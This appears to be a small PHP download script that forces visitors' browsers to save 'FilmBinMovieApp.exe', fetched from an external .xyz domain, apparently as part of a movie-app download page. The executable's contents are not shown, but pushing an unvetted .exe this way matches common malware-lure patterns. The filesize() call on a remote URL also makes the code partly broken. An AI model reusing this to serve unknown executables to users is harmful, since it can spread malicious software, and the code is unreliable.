<?php
$file='https://filmbinapp3.xyz/dl.php?link=FilmBinMovieApp.exe';    
header("Content-type: application/force-download");
header("Content-Transfer-Encoding: Binary");
header("Content-length: ".filesize($file));
header("Content-disposition: attachment; filename=\"".basename($file)."\"");
readfile("$file");
